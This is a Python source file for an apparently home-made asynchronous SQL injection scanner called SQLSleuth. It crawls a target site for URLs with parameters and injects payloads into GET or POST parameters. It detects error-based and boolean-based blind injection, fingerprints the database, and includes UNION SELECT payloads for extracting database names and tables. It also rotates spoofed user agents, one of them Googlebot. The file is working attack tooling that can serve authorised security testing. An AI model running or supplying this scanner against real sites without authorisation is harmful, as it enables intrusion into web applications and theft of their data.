import argparse
import random
import re
import asyncio
import aiohttp
from colorama import Fore, Style
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup

# ------------------ Error Signatures ------------------
ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "mysql_fetch_array()",
    "unclosed quotation mark", "quoted string not properly terminated",
    "sqlstate", "native client", "odbc",
    "ora-01756",
    "pg_query()", "syntax error at or near", "unterminated quoted string", "psql: FATAL",
    "sqlite3.OperationalError", "database disk image is malformed", "sqlite3.DatabaseError"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.60 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

LOG_FILE = "scan_results.txt"

# ------------------ DB Payloads ------------------
DB_DUMP_PAYLOADS = {
    "MySQL": "' UNION SELECT database(),null-- ",
    "PostgreSQL": "' UNION SELECT current_database(),null-- ",
    "MSSQL": "' UNION SELECT DB_NAME(),null-- ",
    "Oracle": "' UNION SELECT ora_database_name FROM dual-- ",
    "SQLite": "' UNION SELECT name FROM sqlite_master WHERE type='table'-- "
}

DB_BOOLEAN_PAYLOADS = {
    "MySQL": (" AND 1=1-- ", " AND 1=2-- "),
    "PostgreSQL": (" AND 1=1-- ", " AND 1=2-- "),
    "MSSQL": (" AND 1=1-- ", " AND 1=2-- "),
    "Oracle": (" AND 1=1-- ", " AND 1=2-- "),
    "SQLite": (" AND 1=1-- ", " AND 1=2-- ")
}

# ------------------ Utility Functions ------------------
def log_result(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def is_vulnerable(response_text):
    return any(err.lower() in response_text.lower() for err in ERROR_SIGNATURES)

def load_payloads(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Payload file '{file_path}' not found!" + Style.RESET_ALL)
        return []

def parse_cookie(cookie_str):
    cookies = {}
    if cookie_str:
        for part in cookie_str.split(';'):
            if '=' in part:
                k, v = part.strip().split('=', 1)
                cookies[k] = v
    return cookies

def parse_headers(header_list):
    headers = {}
    if header_list:
        for header in header_list:
            if ':' in header:
                k, v = header.split(':', 1)
                headers[k.strip()] = v.strip()
    return headers

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# ------------------ Async Requests ------------------
async def send_async_request(url, method="GET", payload=None, cookies=None, headers=None, post_data=None):
    if headers is None:
        headers = {"User-Agent": get_random_user_agent()}
    else:
        headers.setdefault("User-Agent", get_random_user_agent())

    try:
        async with aiohttp.ClientSession() as session:
            if method == "POST" and post_data:
                data_dict = dict(x.split('=',1) for x in post_data.replace("INJECT", payload).split('&'))
                async with session.post(url, data=data_dict, cookies=cookies, headers=headers, timeout=10) as resp:
                    return await resp.text()
            else:
                # Properly replace payload in URL parameters
                if payload:
                    parsed = urlparse(url)
                    query = parse_qs(parsed.query)
                    for key in query:
                        query[key] = [query[key][0] + payload]
                    url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(query, doseq=True), parsed.fragment))
                async with session.get(url, cookies=cookies, headers=headers, timeout=10) as resp:
                    return await resp.text()
    except:
        return None

# ------------------ Async Crawler ------------------
visited = set()
async def crawl_async(start_url, max_depth=2):
    queue = [(start_url,0)]
    urls_to_scan = []
    async with aiohttp.ClientSession() as session:
        while queue:
            url, depth = queue.pop(0)
            if url in visited or depth>max_depth:
                continue
            visited.add(url)
            try:
                async with session.get(url, timeout=5, headers={"User-Agent":get_random_user_agent()}) as resp:
                    if resp.status !=200:
                        continue
                    html = await resp.text()
                    soup = BeautifulSoup(html,"html.parser")
                    for link in soup.find_all("a",href=True):
                        full_url = urljoin(url,link["href"])
                        if urlparse(full_url).netloc != urlparse(start_url).netloc:
                            continue
                        if full_url not in visited:
                            if "?" in full_url:
                                urls_to_scan.append(full_url)
                            queue.append((full_url,depth+1))
            except:
                continue
    return urls_to_scan

# ------------------ SQLi Tests ------------------
async def test_error_based(url, payload_file, method="GET", post_data=None, cookies=None, headers=None, dump=False):
    payloads = load_payloads(payload_file)
    if not payloads:
        return
    print(f"[i] Testing {url} for error-based SQLi using {len(payloads)} payloads...")
    log_result(f"[*] Started error-based scan on {url}")
    found_vulnerable=False
    async def worker(payload):
        nonlocal found_vulnerable
        if found_vulnerable:
            return
        response = await send_async_request(url, method, payload, cookies, headers, post_data)
        if response and is_vulnerable(response):
            print(Fore.GREEN + f"[+] Vulnerable! SQL error triggered with payload: {payload}" + Style.RESET_ALL)
            log_result(f"[VULNERABLE] {url} | Payload: {payload}")
            found_vulnerable=True
    await asyncio.gather(*[worker(p) for p in payloads])
    if not found_vulnerable:
        print(Fore.YELLOW + "[!] No error-based SQLi found with current payloads." + Style.RESET_ALL)
        log_result(f"[SAFE] No error-based SQLi detected on {url}")

async def test_boolean_based(url, method="GET", post_data=None, cookies=None, headers=None, dump=False):
    print(f"[i] Testing {url} for Boolean-based blind SQLi...")
    r_test = await send_async_request(url, method, "'", cookies, headers, post_data)
    db_type = "Unknown"
    if r_test:
        text = r_test.lower()
        if "mysql" in text or "mysql_fetch_array" in text:
            db_type="MySQL"
        elif "pg_" in text or "postgresql" in text:
            db_type="PostgreSQL"
        elif "ora-" in text:
            db_type="Oracle"
        elif "sqlite" in text:
            db_type="SQLite"
        elif "unclosed quotation mark" in text or "sqlserver" in text:
            db_type="MSSQL"

    true_payload,false_payload=DB_BOOLEAN_PAYLOADS.get(db_type,(" AND 1=1--"," AND 1=2--"))
    r_true=await send_async_request(url, method, true_payload, cookies, headers, post_data)
    r_false=await send_async_request(url, method, false_payload, cookies, headers, post_data)
    if r_true and r_false and len(r_true)!=len(r_false):
        print(Fore.GREEN+f"[+] Boolean-based SQLi detected at {url} (DB: {db_type})"+Style.RESET_ALL)
        log_result(f"[VULNERABLE] Boolean-based SQLi detected at {url} (DB: {db_type})")
    else:
        print(Fore.YELLOW+"[!] No Boolean-based differences found (not conclusive)."+Style.RESET_ALL)
        log_result(f"[SAFE] No Boolean-based SQLi detected on {url}")

# ------------------ Main ------------------
async def main():
    parser = argparse.ArgumentParser(description="SQLSleuth - Fully Async SQL Injection Scanner")
    parser.add_argument("-u","--url",help="Target URL with parameter (e.g., http://site.com/page?id=1)")
    parser.add_argument("-d","--data",help="POST data (use 'INJECT' where payload should be injected)")
    parser.add_argument("-c","--cookie",help="Session cookies (e.g., PHPSESSID=abc123; security=low)")
    parser.add_argument("--header",action="append",help="Custom headers (e.g., 'User-Agent: Custom')")
    parser.add_argument("-p","--payloads",default="payloads.txt",help="Custom payload file (default: payloads.txt)")
    parser.add_argument("--dump",action="store_true",help="Enable experimental DB extraction")
    parser.add_argument("--crawl",action="store_true",help="Crawl site for parameterized URLs before scanning")
    args = parser.parse_args()

    if not args.url:
        print(Fore.RED+"[!] Missing target URL (-u)"+Style.RESET_ALL)
        return

    cookies=parse_cookie(args.cookie) if args.cookie else None
    headers=parse_headers(args.header) if args.header else None
    method="POST" if args.data else "GET"

    targets=[args.url]
    if args.crawl:
        print(Fore.CYAN+"[*] Crawling for URLs with parameters..."+Style.RESET_ALL)
        crawled_urls=await crawl_async(args.url)
        targets.extend(crawled_urls)
        targets=list(set(targets))
        print(Fore.CYAN+f"[*] Found {len(targets)} URLs to scan."+Style.RESET_ALL)

    for target in targets:
        log_result(f"\n=== New Scan Started ===")
        log_result(f"Target: {target} | Method: {method} | Payloads: {args.payloads}")

        await test_error_based(target,args.payloads,method,args.data,cookies,headers,args.dump)
        await test_boolean_based(target,method,args.data,cookies,headers,args.dump)

        log_result(f"=== Scan Finished for {target} ===\n")

if __name__=="__main__":
    asyncio.run(main())

